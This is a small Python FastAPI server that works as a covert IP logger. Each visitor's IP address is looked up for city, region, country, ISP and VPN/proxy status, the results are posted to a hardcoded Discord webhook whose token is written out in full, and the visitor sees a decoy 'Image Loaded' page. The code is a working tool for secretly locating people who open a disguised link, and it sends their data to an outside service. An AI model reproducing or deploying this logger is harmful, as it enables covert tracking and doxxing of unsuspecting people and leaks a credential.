from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()

WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"

@app.get("/")
async def log_request(request: Request):
    # Get the IP address
    client_ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0].strip()
    
    # Get detailed info from IP-API
    try:
        # Requesting data with fields for location, isp, and proxy status
        resp = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,message,country,regionName,city,zip,isp,proxy,query").json()
        
        if resp.get("status") == "success":
            message = (
                f"**New Visitor Logged!**\n"
                f"**IP:** {resp.get('query')}\n"
                f"**ISP:** {resp.get('isp')}\n"
                f"**Location:** {resp.get('city')}, {resp.get('regionName')}, {resp.get('country')}\n"
                f"**VPN/Proxy:** {resp.get('proxy')}"
            )
        else:
            message = f"**New Visitor!**\nIP: {client_ip}"
            
        requests.post(WEBHOOK_URL, json={"content": message}, timeout=3)
    except:
        pass

    # Simple HTML response
    return HTMLResponse(content="<html><body><h1>Image Loaded</h1></body></html>")
